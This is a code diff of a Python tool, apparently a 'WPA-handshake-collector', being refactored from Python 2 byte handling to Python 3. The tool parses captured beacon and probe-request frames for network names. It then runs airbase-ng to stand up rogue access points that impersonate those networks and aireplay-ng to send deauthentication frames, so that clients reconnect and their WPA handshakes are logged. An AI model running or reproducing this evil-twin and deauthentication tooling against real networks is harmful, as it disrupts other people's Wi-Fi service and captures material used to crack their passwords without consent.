@@ -1,6 +1,3 @@
-# TODO:
-# проверить, верно ли работает
-# запускающий ТД поток
 
 from Logger import Logger
 from Monitor import Monitor
@@ -18,7 +15,7 @@ cache = []
 dump_num = 5
 
 
-def start_AP(essid, bssid, netw_iface, path, channel):
+def start_AP(essid, bssid, netw_iface, path, channel, logger):
     '''
     start new access point with certain parameters
     input:
@@ -32,26 +29,30 @@ def start_AP(essid, bssid, netw_iface, path, channel):
     '''
     try:
         import subprocess
-        output = subprocess.run(["airmon-ng", "start", netw_iface, channel], capture_output=True)
-        iwfaces = output.stdout.decode('utf-8')
-        new_iface = get_mon_iface_name(iwfaces)
+        # output = subprocess.run(["airmon-ng", "start", netw_iface, channel], capture_output=True)
+        # iwfaces = output.stdout.decode('utf-8')
+        mon = Monitor(logger)
+        new_mon = mon.push(netw_iface, channel)
+        lock.acquire()
+        mon.logger.addToLine('start_AP', "new interface " + new_mon, 'log')
+        lock.release()
         
         kill = lambda process: process.terminate()
         import os
         os.chdir(path + "/logs/")
         if bssid == b"\xff\xff\xff\xff\xff\xff":
-            cmd = subprocess.Popen(["airbase-ng", "--essid", essid, "-c", channel, "-F", essid + "_log", "-Z", "4", new_iface])
+            cmd = subprocess.Popen(["airbase-ng", "--essid", essid, "-c", channel, "-F", essid + "_log", "-Z", "4", new_mon])
         else:
-            cmd = subprocess.Popen(["airbase-ng", "--essid", essid,"-a", hexlify(bssid), "-c", channel, "-F", essid + "_log", "-Z", "4", new_iface])
+            cmd = subprocess.Popen(["airbase-ng", "--essid", essid,"-a", hexlify(bssid), "-c", channel, "-F", essid + "_log", "-Z", "4", new_mon])
         timer = threading.Timer(3, kill, [cmd])
         try:
             timer.start()
             if (bssid) != b"\xff\xff\xff\xff\xff\xff":
-                subprocess.check_call(["aireplay-ng", "-e", essid, "-a", hexlify(bssid), "--deauth", "4", new_iface])
+                subprocess.check_call(["aireplay-ng", "-e", essid, "-a", hexlify(bssid), "--deauth", "4", new_mon])
             stdout, stderr = cmd.communicate()
         finally:
             timer.cancel()
-            subprocess.check_call(["airmon-ng", "stop", new_iface, channel])
+            subprocess.check_call(["airmon-ng", "stop", new_mon, channel])
             #subprocess.call(["python", path + "/converter_p.2.7.py", essid + "_log-01.cap", "hccap"])
 
     except Exception as e:
@@ -88,14 +89,19 @@ def lookup_dump(pcap_dump, netw_iface, path, logger):
                     _pack = unhexlify(packets[packet_index].packet)
                     lock.acquire()
                     logger.addToLine(
-                        'lookup_dump', f"{str(packet_index)}\t{str(time()*1000 - start)} passed", 'log')
+                        'lookup_dump', str(_pack), 'log')
+                    logger.addToLine(
+                        'lookup_dump', str(type(_pack[0]))+str(_pack[0]), 'log')
+                    logger.addToLine(
+                        'lookup_dump', str(type(b'\x80'))+str(b'\x80'), 'log')
                     lock.release()
                     # if the packet is really a beacon
-                    if flag == True and _pack[0] == b'\x80':
-                        essid_len = int(_pack[37].encode("hex"), 16)
+                    if 128 == _pack[0]:
+
+                        essid_len = _pack[37]
                         # ---------
                         if essid_len != 0:
-                            current_essid = (_pack[38: 38 + essid_len]).encode("ascii")
+                            current_essid = (_pack[38: 38 + essid_len]).decode("ascii")
                             if (_pack[38: 38 + essid_len]) != b'\xff\xff\xff\xff\xff\xff' and not(current_essid in cache):  # if we've already seen this ESSID before
                                 lock.acquire()
                                 logger.addToLine(
@@ -104,17 +110,17 @@ def lookup_dump(pcap_dump, netw_iface, path, logger):
                                 cache.append(current_essid)
                                 # ------
                                 bssid = _pack[16: 22]
-                                rates_len = int(_pack[38 + essid_len + 1].encode("hex"), 16)
-                                channel = int(unhexlify((packets[packet_index].packet))[38 + essid_len + 1 + rates_len + 1 + 1 + 1].encode("hex"), 16)
-                                task_AP = Thread(start_AP(current_essid, bssid, netw_iface, path, str(channel)))
+                                rates_len = int(_pack[38 + essid_len + 1], 16)
+                                channel = _pack[38 + essid_len + 1 + rates_len + 1 + 1 + 1]
+                                task_AP = Thread(start_AP(current_essid, bssid, netw_iface, path, str(channel), logger))
                                 task_AP.start()
                         # ---------
                     
-                    elif flag == False and _pack[0] == b'\x40':  # or if the packet is really a probe request
-                        essid_len = int(_pack[25].encode("hex"), 16)
+                    elif 64 == _pack[0]:  # or if the packet is really a probe request
+                        essid_len = _pack[25]
                         # ---------
                         if essid_len != 0:
-                            current_essid = (_pack[26: 26 + essid_len]).encode("ascii")
+                            current_essid = (_pack[26: 26 + essid_len]).decode("ascii")
                             if (_pack[26: 26 + essid_len]) != b'\xff\xff\xff\xff\xff\xff':  # if we've already seen this ESSID before
                                 lock.acquire()
                                 logger.addToLine('lookup_dump', "in "  + str(packet_index + 1) +\
@@ -123,7 +129,7 @@ def lookup_dump(pcap_dump, netw_iface, path, logger):
 
                                 cache.append(current_essid)
                                 # ------
-                                task_AP = Thread(start_AP(current_essid, b"\xff\xff\xff\xff\xff\xff", netw_iface, path, str(1)))
+                                task_AP = Thread(start_AP(current_essid, b"\xff\xff\xff\xff\xff\xff", netw_iface, path, str(1), logger))
                                 task_AP.start()
                         # ---------
                     
@@ -146,14 +152,10 @@ def lookup_dump(pcap_dump, netw_iface, path, logger):
                 error_index += 1
 
             except IndexError:
-                if flag == True:
-                    lock.acquire()
-                    logger.addToLine('lookup_dump', 'Scan is done', 'log')
-                    lock.release()
-                    break
-                else:
-                    flag = True
-                    packet_index = -1
+                lock.acquire()
+                logger.addToLine('lookup_dump', 'Scan is done', 'log')
+                lock.release()
+                break
 
             except Exception as e:
                 print(str(e))
@@ -293,12 +295,12 @@ if __name__ == "__main__":
         exit_code = subprocess.call(os.getcwd() + '/del_recent_dumps.sh')'''
         # --
         # create dump folders and enter
-        cwd = create_folders()
+        cwd = '/home/bob/dev/python/WPA-handshake-collector/WPA-handshake-collector/2022-05-18 19:35:58.447306'#create_folders()
         os.chdir(cwd)
         while True:
             task1 = Thread(target = start_sniffer, args=(namespace.listen, cwd, logger))
             task2 = Thread(target = start_sender, args=(namespace.send, cwd, logger))
-            task1.start()
+            # task1.start()
             sleep(3)
             task2.start()
             lock.acquire()
